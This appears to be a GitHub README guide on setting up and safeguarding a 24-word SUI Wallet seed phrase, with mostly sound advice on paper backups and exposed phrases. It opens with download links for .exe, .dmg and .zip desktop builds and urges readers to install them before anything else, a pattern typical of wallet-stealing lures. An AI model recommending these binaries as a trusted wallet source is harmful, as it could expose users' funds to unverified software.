![SUI Wallet](assets/banner-article.png)

# SUI Wallet seed phrase setup

Twenty-four words generated on your machine, written down once, never typed into a website.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

The 24 words are the account. They are generated on your machine when the wallet is created, shown once,
confirmed once, and never displayed again without a deliberate step in the app. Whoever holds the words
holds the funds, and no support channel holds a copy of them.

## What the 24 words are

A recovery phrase encodes, in readable form, the secret that controls an account. Twenty-four words from
a fixed list, in a fixed order, encode it exactly: type them into a wallet and it derives the same
accounts with the same addresses. That is why the words matter more than the file: the application can be
[downloaded again](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest), the words cannot.

## Why 24 words and not 12

Both lengths exist in the wider ecosystem, and they are not equivalent - a 12-word phrase and a 24-word
phrase are different secrets, not shorter and longer spellings of one. This wallet generates 24, and a
screen asking for 12 is either a different product or a different feature.

The practical consequence is worth stating plainly: a phrase that arrives with 10 or 12 words did not come
from this wallet. It is not a truncated 24-word phrase, and there is nothing to pad out.

## The confirmation step

After the app shows the words, it asks you to confirm them - usually by selecting words back in order.
That step exists to catch the case where the words were read rather than written: a confirmation you can
pass from the screen in front of you proves nothing about what will be on paper tomorrow.

Treat the confirmation as the real test. If you cannot complete it from your own copy, stop and start
again before the wallet holds anything.

## Where the words should be written

On paper, or on metal, by hand, in order, and stored somewhere other than beside the machine. Paper is
cheap and works offline; its weakness is water, fire and time. Stamped metal survives those and costs
more; its weakness is that it is conspicuous.

What matters more than the material is the separation: a phrase stored in the same bag as the laptop is
one incident away from being lost with it. [Backing up your SUI Wallet recovery phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/backing-up-your-sui-wallet-recovery-phrase.md) takes
the materials and the storage question in more detail, including how to prove a backup works before you
need it.

## Where they should never be

- **A photograph.** The camera roll syncs, and a synced photograph is a copy in somebody else's data
  centre.
- **A cloud note or a password manager entry.** Convenient, searchable, and reachable by anyone who gets
  into the account that holds it.
- **A chat message to yourself.** The same as the cloud note, with a second copy on the recipient's
  server.
- **A file on the same machine as the wallet.** The machine is the thing most likely to be lost,
  replaced or compromised.

Each of these is a copy of the account in a place an attacker can reach without ever touching your
machine - which is exactly the definition of a backup that is weaker than paper in a drawer, whatever the
convenience of it.

## If the words were photographed

Assume the account is exposed rather than hoping it is not. Creating a fresh account, moving the balance
to it, and treating the old one as burned is the sequence; a phrase cannot be un-shared, and no wallet
can revoke it. [Someone has my SUI Wallet seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/someone-has-my-sui-wallet-seed-phrase.md) walks that sequence in order, starting
with the ten minutes that matter most.

## When the phrase screen says the phrase is wrong

Two cases, and they look alike but are not. If the form rejects a correct phrase as you type it, the
usual cause is a word that is valid but not in the list at that position - the form validates as you go,
and one mistyped letter is enough.

If it accepts the phrase and shows an empty account, the words are all real and in the wrong order, or
they belong to a different wallet's phrase. [Restoring SUI Wallet from a seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/restoring-sui-wallet-from-seed-phrase.md) covers what
the app shows before it reports success, which is how you tell the two apart without guessing.

## FAQ

### Does SUI Wallet have a seed phrase?

Yes. Creation generates a 24-word phrase on the machine and shows it once, with a confirmation step.

### How many words are in a recovery phrase?

Twenty-four. A screen offering 12 is a different flow, and a phrase with 10 words is not a phrase this
wallet can accept at all.

### Can I use one phrase for several accounts?

Yes. One phrase can hold several accounts, each with its own address, and the account selector switches
between them. Restoring the phrase restores the accounts it derives.

### Why do I only have 10 words in my recovery phrase?

Because it is not a complete phrase from this wallet - either the words were copied from something else,
or the copy was cut short. Check the original you wrote down before typing anything further.

### Do I need the phrase to send a transaction?

No. Sending uses the wallet you already unlocked. The phrase is for creating and restoring an account,
which is why it appears twice in the product's life and not in between.

### Is the phrase the same as a password?

No. A password, where a flow uses one, protects the app on one machine; the phrase controls the account
itself, on every machine, forever. Losing the first is an inconvenience and losing the second is the
account.
